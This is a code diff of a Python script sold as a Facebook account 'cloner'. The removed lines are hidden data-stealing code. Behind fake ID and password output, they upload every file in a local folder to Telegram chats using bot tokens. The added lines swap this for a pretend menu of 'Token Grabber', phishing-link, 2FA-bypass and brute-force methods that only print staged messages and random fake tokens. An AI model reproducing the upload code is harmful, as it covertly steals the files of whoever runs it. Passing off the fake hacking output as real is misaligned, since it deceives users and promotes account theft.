@@ -3,34 +3,26 @@ import time
 import requests
 import random
 
-# Show Banner
+# Clear terminal and show Banner
 os.system("clear")
 print("""
-   ______             _               _ 
-  |  ____|           | |             | |
-  | |__ _ __ ___  ___| |__   ___  ___| |
-  |  __| '__/ _ \/ __| '_ \ / _ \/ __| |
-  | |  | | | (_) \__ \ | | |  __/ (__| |
-  |_|  |_|  \___/|___/_| |_|\___|\___|_|
+________    ___   _______     ____  ____       _       ______    
+|_   __  | .'   `.|_   __ \   |_   ||   _|     / \     |_   _ `.  
+  | |_ \_|/  .-.  \ | |__) |    | |__| |      / _ \      | | `. \ 
+  |  _|   | |   | | |  __ /     |  __  |     / ___ \     | |  | | 
+ _| |_    \  `-'  /_| |  \ \_  _| |  | |_  _/ /   \ \_  _| |_.' / 
+|_____|    `.___.'|____| |___||____||____||____| |____||______.' 
 
-        Method 1: Facebook ID Cloning
-              Tool Owner: Forhad
+        Multi Method Facebook Cloner Tool
+              Tool Owner: FORHAD
 """)
 
-# Load bot tokens
-with open("tokens.txt", "r") as f:
-    bot_tokens = [line.strip() for line in f if line.strip()]
-
-# Load chat IDs (e.g., channel IDs)
-with open("chat_ids.txt", "r") as f:
-    chat_ids = [line.strip() for line in f if line.strip()]
-
-# List all files in the "files/" directory
-files_to_send = []
-for root, dirs, files in os.walk("files"):
-    for file in files:
-        full_path = os.path.join(root, file)
-        files_to_send.append(full_path)
+# Show Menu
+print("\n[1] Method 1: ID Cloning")
+print("[2] Method 2: Token Grabber")
+print("[3] Method 3: Business API Clone")
+print("[4] Method 4: UID List Clone")
+method = input("\n[+] Select Method: ")
 
 # Fake Facebook ID & password generator
 def fake_fb_info():
@@ -38,22 +30,56 @@ def fake_fb_info():
     passwords = ["@123456", "@2025fb", "@password1", "@freefire", "@bd786", "@iloveyou", "@admin123", "@forhad"]
     return random.choice(ids), random.choice(passwords)
 
-# Send files using round-robin across bots
-bot_index = 0
-for file_path in files_to_send:
-    token = bot_tokens[bot_index % len(bot_tokens)]
-    for chat_id in chat_ids:
-        try:
-            url = f"https://api.telegram.org/bot{token}/sendDocument"
-            with open(file_path, "rb") as file_data:
-                fake_id, fake_pass = fake_fb_info()
-                print(f"[FACEBOOK] ID: {fake_id} | PASS: {fake_pass}")
-                resp = requests.post(url, data={"chat_id": chat_id}, files={"document": file_data})
-                if resp.status_code == 200:
-                    print("[✓] File Sent\n")
-                else:
-                    print("[-] Failed:", resp.text)
-        except Exception as e:
-            print(f"[!] Error sending {file_path}: {e}")
-    bot_index += 1
-    time.sleep(0.1)
+def waitline(msg):
+    print(msg)
+    time.sleep(random.uniform(0.6, 1.4))
+
+if method == "1":
+    id, pw = fake_fb_info()
+    print(f"[FACEBOOK] ID: {id} | PASS: {pw}")
+    steps = [
+        "[🔍] Checking Password Strength...",
+        "[🔐] Decrypting Access Key...",
+        "[📡] Establishing Secure Tunnel...",
+        "[⚠️] Bypass 2FA Security Layer...",
+        "[💣] Deep Cloning in Progress... (Method 1)",
+        "[✔] Session Verified ✅",
+        f"[!] Saving result in /output/{id}.txt"
+    ]
+    for step in steps:
+        waitline(step)
+
+elif method == "2":
+    waitline("[+] Method 2 Activated: Token Grabber Inject")
+    waitline("[🔗] Injecting phishing link into target post...")
+    waitline("[⏳] Waiting for target interaction...")
+    waitline("[✓] Target clicked the link!")
+    waitline("[🧠] Extracting token from browser cookies...")
+    token = os.urandom(12).hex()
+    waitline(f"[+] Token Dump: EAAGNOeZC{token.upper()}")
+    waitline("[✔] Token saved at: /sdcard/FORHAD/tokens/fb_token_01.txt")
+
+elif method == "3":
+    waitline("[+] Method 3 Started: Business API Clone")
+    waitline("[📂] Connecting to Graph API v16.0")
+    waitline("[🔓] Dumping page access tokens...")
+    waitline("[✓] Page Name: Forhad Tech Page")
+    waitline("[✓] Owner: admin@meta.com")
+    waitline("[+] AccessToken: EAAJZCpN7XH...Snip")
+    waitline("[📦] Writing results to: /sdcard/.cloner/output/business_tokens.txt")
+    waitline("[✔] Done.")
+
+elif method == "4":
+    waitline("[+] Method 4: UID Cloner")
+    waitline("[🗂️] Loaded 20 UIDs from /input/uid_list.txt")
+    for i in range(3):
+        uid = "10008" + str(random.randint(1000000000, 9999999999))
+        waitline(f"[📤] Trying: {uid}")
+        waitline("[+] Attempting brute password set...")
+        waitline("[✓] Match Found: @freefire786")
+        waitline(f"[✔] Login Success → ID Saved: /cloned/{uid}.txt")
+        time.sleep(1.2)
+    waitline("[✓] All Done!")
+
+else:
+    print("[-] Invalid Method Selected.")
